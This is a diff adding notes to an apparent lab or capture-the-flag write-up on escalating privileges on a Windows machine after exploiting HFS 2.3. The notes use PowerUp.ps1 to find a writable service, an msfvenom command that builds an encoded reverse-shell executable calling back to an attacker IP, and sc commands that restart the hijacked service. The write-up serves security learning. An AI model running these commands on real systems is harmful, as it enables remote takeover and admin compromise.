@@ -22,3 +22,25 @@ the software running (hfs or http file server 2.3) is vulnerable to a couple exp
 
 exploiting the software in metasploit gets a shell..
 
+once we are in a reverse shell, lets try and run a powershell priviledge escalation script
+similar to linpeas called 'powerup.ps1'
+
+first we need to load powershell into metasploit using 'load powershell'
+
+then upload the shell with 'upload PATH_TO_FILE'
+
+powerup.ps1 points out that a service 'AdvancedSystemCareService9' has the value 'CanRestart' and is writable to us! this means that we can replace the binary with our own shell and escalate to admin!
+
+ASCService.exe
+
+lets generate a windows shell with msfvenom and do exactly this
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.93.140 LPORT=1337 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+
+after uploading our own shell, and restarting the service 'sc stop SERVICENAME' and then 
+'sc start SERVICENAME'
+
+
+
+
+
